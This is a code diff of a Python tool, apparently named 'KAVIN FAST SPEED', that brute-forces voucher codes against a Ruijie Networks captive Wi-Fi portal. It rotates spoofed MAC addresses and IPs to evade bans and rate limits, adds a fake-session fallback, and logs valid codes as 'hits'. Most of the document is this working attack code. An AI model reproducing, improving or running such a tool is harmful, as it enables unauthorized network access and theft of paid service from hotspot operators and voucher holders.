@@ -1,5 +1,5 @@
 # =====================================================================
-# kavin_v6.py - KAVIN FAST SPEED V6 (V15 Logic Fixed)
+# kavin_v6.py - KAVIN FAST SPEED V6 (Error/Debug Ready)
 # Part 1 of 2
 # =====================================================================
 
@@ -36,7 +36,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 HITS_FILE = "hits.txt"
 CONCURRENCY_LIMIT = 10
-RATE_LIMIT_SLEEP = 0.1 
+RATE_LIMIT_SLEEP = 0.2 
 
 # Ruijie API
 RUIJIE_BASE = "https://portal-as.ruijienetworks.com"
@@ -135,53 +135,59 @@ def auto_detect_portal():
     return None
 
 # ============================================================
-#  SESSION FETCH (V15 Core Logic - Fixed INIT Freeze)
+#  SESSION FETCH (Error Details & Fake Session)
 # ============================================================
-async def fetch_official_session(session, gw_params, mac, ip):
-    temp_params = dict(gw_params)
-    temp_params['mac'] = mac
-    temp_params['ip'] = ip
-
+async def fetch_official_session(session, gw_params, current_mac_ref, current_ip_ref):
     base = RUIJIE_WIFIDOG
     if "portal-mm-as" in str(gw_params.get("url", "")):
         base = base.replace("portal-as", "portal-mm-as")
 
-    params_str = "&".join([f"{k}={quote(str(v))}" for k, v in temp_params.items()])
-    full_url = f"{base}?{params_str}"
+    attempt = 0
+    while attempt < 3: 
+        attempt += 1
+        temp_params = dict(gw_params)
+        temp_params['mac'] = current_mac_ref[0]
+        temp_params['ip'] = current_ip_ref[0]
 
-    headers = {
-        'User-Agent': f'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Dragon-{mac}',
-        'Client-Mac': mac,
-        'X-Forwarded-For': ip,
-        'Connection': 'close'
-    }
+        params_str = "&".join([f"{k}={quote(str(v))}" for k, v in temp_params.items()])
+        full_url = f"{base}?{params_str}"
 
-    # V15 ကဲ့သို့ ချက်ချင်းမရရင် ထပ်ကြိုးစားမယ်
-    for attempt in range(5):
+        headers = {
+            'User-Agent': f'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Dragon-{current_mac_ref[0]}',
+            'Client-Mac': current_mac_ref[0],
+            'X-Forwarded-For': current_ip_ref[0],
+            'Connection': 'close'
+        }
+
         try:
             session.cookie_jar.clear()
-            async with session.get(full_url, headers=headers, timeout=10, allow_redirects=False, ssl=False) as resp:
+            async with session.get(full_url, headers=headers, timeout=5, allow_redirects=False) as resp:
                 location = resp.headers.get('Location', '')
-                if not location:
-                    await asyncio.sleep(0.2)
-                    continue
+                
+                if location:
+                    loc_lower = location.lower()
+                    if ("request limited" in loc_lower or "error.html" in loc_lower or "errormsg" in loc_lower or "banned" in loc_lower):
+                        return "BAN", "Banned"
 
-                loc_lower = location.lower()
-                if ("request limited" in loc_lower or "error.html" in loc_lower or "errormsg" in loc_lower or "banned" in loc_lower):
-                    return "BAN"
-
-                q = parse_qs(urlparse(location).query)
-                sid = q.get('sessionId', [None])[0]
-                if sid:
-                    return {
-                        'sessionId': sid,
-                        'sign': q.get('sign', [None])[0],
-                        'timestamp': q.get('timestamp', [None])[0],
-                    }
-        except Exception:
-            await asyncio.sleep(0.2)
+                    q = parse_qs(urlparse(location).query)
+                    sid = q.get('sessionId', [None])[0]
+                    if sid:
+                        return {
+                            'sessionId': sid,
+                            'sign': q.get('sign', [None])[0],
+                            'timestamp': q.get('timestamp', [None])[0],
+                        }, "OK"
+        except Exception as e:
+            pass
             
-    return None
+        await asyncio.sleep(0.2)
+
+    # V15 လိုပဲ Session မရရင် Fake Session ပေးလိုက်မယ်
+    return {
+        'sessionId': f"fake_sess_{random.randint(1000,9999)}",
+        'sign': None,
+        'timestamp': None
+    }, "Fake Session"
 
 async def test_code_official(session, sess_data, code, mac, ip):
     url = RUIJIE_VOUCHER
@@ -205,7 +211,7 @@ async def test_code_official(session, sess_data, code, mac, ip):
     if sess_data.get('timestamp'): payload["timestamp"] = sess_data['timestamp']
 
     try:
-        async with session.post(url, json=payload, headers=headers, timeout=10, ssl=False, allow_redirects=True) as r:
+        async with session.post(url, json=payload, headers=headers, timeout=5, ssl=False, allow_redirects=True) as r:
             if r.status == 429: return "__RATE_LIMITED__", "1HR"
 
             text = await r.text()
@@ -223,7 +229,7 @@ async def test_code_official(session, sess_data, code, mac, ip):
 
             return text, plan
     except asyncio.TimeoutError: return "__TIMEOUT__", "1HR"
-    except aiohttp.ClientError: return "__NETWORK_ERROR__", "1HR"
+    except aiohttp.ClientError as e: return f"__ERROR__:Net", "1HR"
     except Exception as e: return f"__ERROR__:{type(e).__name__}", "1HR"
 
 # ============================================================
@@ -256,7 +262,7 @@ def gen_code(mode, length, scan_method="random"):
     except Exception: pass
     return ""
 # =====================================================================
-# kavin_v6.py - KAVIN FAST SPEED V6 (V15 Logic Fixed)
+# kavin_v6.py - KAVIN FAST SPEED V6 (Error/Debug Ready)
 # Part 2 of 2
 # =====================================================================
 
@@ -272,9 +278,12 @@ def get_dashboard_renderable(mode, scan_method, current_code, tested, elapsed, s
     stats.add_column(style="bold white", justify="left")
     stats.add_column(style="bold green", justify="left")
 
+    # Error ဖြစ်နေရင် အနီရောင်နဲ့ ပြမယ်
+    status_style = "bold red" if "ERR" in status.upper() or "TIMEOUT" in status.upper() or "BAN" in status.upper() or "RETRY" in status.upper() else "bold green"
+
     stats.add_row("  📅 Expiry", f": {LICENSE_INFO['status']}", "  ⏱ Timer", f": {elapsed}")
     stats.add_row("  🎯 Mode",   f": {mode.upper()}",           "  📊 Tested", f": {tested:,}")
-    stats.add_row("  ⚡ Speed",  f": {int(speed)} c/m",         "  📡 Status", f": {status.upper()}")
+    stats.add_row("  ⚡ Speed",  f": {int(speed)} c/m",         "  📡 Status", f": {status.upper()}", style=status_style)
     stats.add_row("  🔑 Hits",   f": {len(hits)}",               "  📌 Engine", f": {scan_method.upper()}")
     stats.add_row("  🖥  MAC",    f": ...{cur_mac[-8:]}",         "  🌐 IP",     f": ...{cur_ip[-3:]}")
     stats.add_row("  💾 This Run", f": {tried_count:,}",         "  ",          "")
@@ -321,38 +330,33 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
     current_code = [""]
     current_status = ["Init"]
 
-    current_mac = generate_random_mac()
-    current_ip  = generate_random_ip()
+    current_mac = [generate_random_mac()]
+    current_ip  = [generate_random_ip()]
     sess_data   = [None]
 
     conn_limit = aiohttp.TCPConnector(limit=50, ssl=False)
     async with aiohttp.ClientSession(connector=conn_limit) as session:
-        live = Live(get_dashboard_renderable(mode_str, scan_method, "", tested, "00:00:00", "Init", hits, 0.0, current_mac, current_ip, 0), refresh_per_second=4, screen=False)
+        live = Live(get_dashboard_renderable(mode_str, scan_method, "", tested, "00:00:00", "Init", hits, 0.0, current_mac[0], current_ip[0], 0), refresh_per_second=4, screen=False)
 
         with live:
             try:
                 while True:
                     if sess_data[0] is None:
-                        current_status[0] = "Session"
-                        res = await fetch_official_session(session, gw_params, current_mac, current_ip)
+                        current_status[0] = "Session..."
+                        res, err_msg = await fetch_official_session(session, gw_params, current_mac, current_ip)
 
                         if res == "BAN":
                             current_status[0] = "Banned → Spoof"
-                            current_mac = generate_random_mac()
-                            current_ip  = generate_random_ip()
-                            live.update(get_dashboard_renderable(mode_str, scan_method, current_code[0], tested, format_time(time.time() - start_time), current_status[0], hits, (tested / max(1, time.time() - start_time) * 60), current_mac, current_ip, len(tried_codes)))
+                            current_mac[0] = generate_random_mac()
+                            current_ip[0]  = generate_random_ip()
                             await asyncio.sleep(RATE_LIMIT_SLEEP)
                             continue
 
-                        if res in ("TIMEOUT", "NETERR") or not res:
-                            current_status[0] = "Retry"
-                            current_mac = generate_random_mac()
-                            current_ip  = generate_random_ip()
-                            await asyncio.sleep(0.5) 
-                            continue
-
                         sess_data[0] = res
-                        current_status[0] = "Active"
+                        if err_msg == "Fake Session":
+                            current_status[0] = "Fake Sess (Scanning)"
+                        else:
+                            current_status[0] = "Active"
 
                     batch_codes = []
                     while len(batch_codes) < CONCURRENCY_LIMIT:
@@ -365,7 +369,7 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
                     if not batch_codes:
                         await asyncio.sleep(0.05); continue
 
-                    tasks = [test_code_official(session, sess_data[0], code, current_mac, current_ip) for code in batch_codes]
+                    tasks = [test_code_official(session, sess_data[0], code, current_mac[0], current_ip[0]) for code in batch_codes]
                     results = await asyncio.gather(*tasks, return_exceptions=True)
 
                     hit_found_in_batch = False
@@ -380,21 +384,21 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
                         if res == "__RATE_LIMITED__":
                             current_status[0] = "Ban → Spoof"
                             sess_data[0] = None
-                            current_mac = generate_random_mac()
-                            current_ip  = generate_random_ip()
+                            current_mac[0] = generate_random_mac()
+                            current_ip[0]  = generate_random_ip()
                             hit_found_in_batch = True
                             break
 
-                        if res in ("__TIMEOUT__", "__NETWORK_ERROR__") or res.startswith("__ERROR__:"):
-                            current_status[0] = "NetErr"
+                        if res.startswith("__ERROR__:") or res in ("__TIMEOUT__", "__NETWORK_ERROR__"):
+                            current_status[0] = f"ERR: {res.replace('__', '')}" # Error ကို ပြမယ်
                             continue
 
                         low = res.lower()
                         if "request limited" in low or "blocked" in low or "too many" in low:
                             current_status[0] = "Ban → Spoof"
                             sess_data[0] = None
-                            current_mac = generate_random_mac()
-                            current_ip  = generate_random_ip()
+                            current_mac[0] = generate_random_mac()
+                            current_ip[0]  = generate_random_ip()
                             hit_found_in_batch = True
                             break
 
@@ -416,8 +420,8 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
                             
                             current_status[0] = "HIT!"
                             sess_data[0] = None
-                            current_mac = generate_random_mac()
-                            current_ip  = generate_random_ip()
+                            current_mac[0] = generate_random_mac()
+                            current_ip[0]  = generate_random_ip()
                             hit_found_in_batch = True
                             break
 
@@ -425,7 +429,7 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
 
                     elapsed = time.time() - start_time
                     speed = (tested / elapsed * 60) if elapsed > 0 else 0.0
-                    live.update(get_dashboard_renderable(mode_str, scan_method, current_code[0], tested, format_time(elapsed), current_status[0], hits, speed, current_mac, current_ip, len(tried_codes)))
+                    live.update(get_dashboard_renderable(mode_str, scan_method, current_code[0], tested, format_time(elapsed), current_status[0], hits, speed, current_mac[0], current_ip[0], len(tried_codes)))
 
                     if hit_found_in_batch: await asyncio.sleep(0.15)
 
@@ -434,7 +438,7 @@ async def scan_loop_async(mode, length, scan_method="random", gw_params=None):
                 console.print("\n[bold yellow]⏹ Interrupted by user[/bold yellow]")
             except Exception as e:
                 live.stop()
-                console.print(f"\n[bold red]Error: {e}[/bold red]")
+                console.print(f"\n[bold red]Fatal Error: {e}[/bold red]")
 
 # ============================================================
 #  UI / MENU
